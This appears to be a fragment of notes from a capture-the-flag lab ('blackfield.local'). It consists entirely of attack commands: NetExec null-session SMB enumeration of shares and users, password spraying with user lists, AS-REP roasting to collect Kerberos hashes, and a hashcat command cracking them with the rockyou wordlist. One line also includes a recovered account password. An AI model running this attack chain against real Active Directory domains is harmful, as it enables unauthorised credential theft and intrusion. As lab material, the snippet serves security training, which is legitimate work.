```
nxc smb blackfield.local -u '' -p ''
nxc smb blackfield.local -u '' -p '' --shares --users
nxc smb blackfield.local -u profiles.txt -p profiles.txt
nxc smb blackfield.local -u users.txt -p '' --asreproast asrep.hashes
nxc smb blackfield.local -u 'support' -p '#00^BlackKnight'

```

```
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
```